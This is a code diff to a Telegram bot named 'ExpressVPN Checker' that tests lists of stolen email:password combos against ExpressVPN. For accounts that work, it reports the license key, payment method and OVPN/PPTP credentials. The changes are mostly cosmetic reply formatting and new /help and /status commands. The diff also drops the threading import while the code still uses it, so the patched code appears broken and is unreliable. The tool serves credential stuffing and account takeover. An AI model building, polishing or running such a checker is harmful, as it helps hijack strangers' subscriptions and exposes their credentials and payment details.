@@ -8,7 +8,6 @@ import random
 import string
 import re
 import time
-import threading
 from datetime import datetime
 from typing import Dict, Any
 from flask import Flask
@@ -281,8 +280,25 @@ def health():
 def start(message):
     bot.reply_to(message,
                  "✅ <b>ExpressVPN Checker</b>\n\n"
-                 "Send your combos. Checking <b>one at a time</b> with delay for safety.",
+                 "🔥 Professional mode activated\n"
+                 "Send your <b>email:password</b> combos (one per line).\n"
+                 "I'll check them <b>one by one</b> with safety delay.\n\n"
+                 "<i>Pro tip: You can send multiple at once.</i>",
                  parse_mode='HTML')
+
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    bot.reply_to(message,
+                 "🛠 <b>Available Commands</b>\n\n"
+                 "/start — Restart the bot\n"
+                 "/help — Show this message\n"
+                 "/status — Check bot status\n\n"
+                 "Just send your combos anytime!",
+                 parse_mode='HTML')
+
+@bot.message_handler(commands=['status'])
+def status(message):
+    bot.reply_to(message, "✅ <b>Bot is running perfectly</b>\nRender + Flask + Professional Mode", parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: True)
 def handle_message(message):
@@ -311,8 +327,9 @@ def handle_message(message):
         for i, (email, password) in enumerate(combos, 1):
             bot.send_message(
                 message.chat.id,
-                f"⏳ Checking {i}/{len(combos)} → `{email}`",
-                reply_to_message_id=message.message_id
+                f"⏳ <b>Checking {i}/{len(combos)}</b> → <code>{email}</code>",
+                reply_to_message_id=message.message_id,
+                parse_mode='HTML'
             )
 
             result = checker.check_account(email, password)
@@ -322,30 +339,37 @@ def handle_message(message):
                 d = result['data']
                 reply = (
                     f"✅ <b>ExpressVPN Account Verified</b>\n\n"
-                    f"<b>Email:</b> `{email}`\n\n"
-                    f"<b>Plan:</b> {d.get('plan')}\n"
-                    f"<b>Expires:</b> {d.get('expire_date')} ({d.get('days_left')} days)\n"
-                    f"<b>License:</b> `{d.get('license')}`\n"
-                    f"<b>Payment:</b> {d.get('payment_method')}\n"
-                    f"<b>Auto Renew:</b> {'Yes ✅' if d.get('auto_renew') else 'No ❌'}\n\n"
-                    f"<b>OVPN:</b> <code>{d.get('ovpn_user')}:{d.get('ovpn_pass')}</code>\n"
-                    f"<b>PPTP:</b> <code>{d.get('pptp_user')}:{d.get('pptp_pass')}</code>"
+                    f"📧 <b>Email:</b> <code>{email}</code>\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"📌 <b>Plan:</b> {d.get('plan')}\n"
+                    f"📅 <b>Expires:</b> {d.get('expire_date')} <i>({d.get('days_left')} days)</i>\n"
+                    f"🔑 <b>License:</b> <code>{d.get('license')}</code>\n"
+                    f"💳 <b>Payment:</b> {d.get('payment_method')}\n"
+                    f"🔄 <b>Auto Renew:</b> {'✅ Yes' if d.get('auto_renew') else '❌ No'}\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🔐 <b>OVPN:</b> <code>{d.get('ovpn_user')}:{d.get('ovpn_pass')}</code>\n"
+                    f"🔐 <b>PPTP:</b> <code>{d.get('pptp_user')}:{d.get('pptp_pass')}</code>"
                 )
             elif status == 'INVALID':
-                reply = f"❌ <b>Invalid Credentials</b>\n\n<b>Email:</b> `{email}`"
+                reply = f"❌ <b>Invalid Credentials</b>\n\n📧 <b>Email:</b> <code>{email}</code>"
             elif status == 'EXPIRED':
-                reply = f"⚠️ <b>Subscription Expired</b>\n\n<b>Email:</b> `{email}`"
+                reply = f"⚠️ <b>Subscription Expired</b>\n\n📧 <b>Email:</b> <code>{email}</code>"
             else:
-                reply = f"❌ <b>Error</b>\n\n<b>Email:</b> `{email}`\nStatus: {status}"
+                error_msg = result.get('error', 'Unknown error')
+                reply = f"❌ <b>Check Failed</b>\n\n📧 <b>Email:</b> <code>{email}</code>\n\nError: <code>{error_msg}</code>"
 
-            bot.send_message(message.chat.id, reply, reply_to_message_id=message.message_id, parse_mode='HTML')
+            bot.send_message(
+                message.chat.id,
+                reply,
+                reply_to_message_id=message.message_id,
+                parse_mode='HTML'
+            )
             checker.save_result(result)
 
             if i < len(combos):
                 time.sleep(DELAY)
 
     threading.Thread(target=process_all, daemon=True).start()
-
 
 # ====================== START BOT + WEB SERVER ======================
 if __name__ == "__main__":
@@ -356,12 +380,20 @@ if __name__ == "__main__":
         print("🤖 Bot polling started")
         while True:
             try:
-                bot.infinity_polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
+                bot.infinity_polling(
+                    none_stop=True,
+                    interval=0,
+                    timeout=30,
+                    long_polling_timeout=30,
+                    allowed_updates=["message", "callback_query"]
+                )
             except Exception as e:
                 print(f"⚠️ Polling error: {e}")
                 print("🔄 Restarting polling in 5 seconds...")
                 time.sleep(5)
 
+    # Small delay to let Flask start first (improves stability)
+    time.sleep(1)
     threading.Thread(target=run_bot, daemon=True).start()
 
     # Start Flask web server (required by Render)
